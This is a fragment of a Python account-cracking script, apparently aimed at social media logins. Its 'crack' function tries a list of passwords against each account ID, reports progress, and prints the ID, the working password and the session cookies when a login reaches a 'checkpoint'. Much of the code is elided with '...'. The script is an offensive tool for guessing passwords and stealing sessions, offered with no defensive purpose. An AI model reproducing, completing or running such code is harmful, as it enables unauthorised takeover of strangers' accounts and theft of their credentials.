...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[ZYREN BEB M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[ZYREN BEB ] {idf} • {pw}\n\033[0;93m[☘️]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " ZYREN BEB,  Ok,  id"')
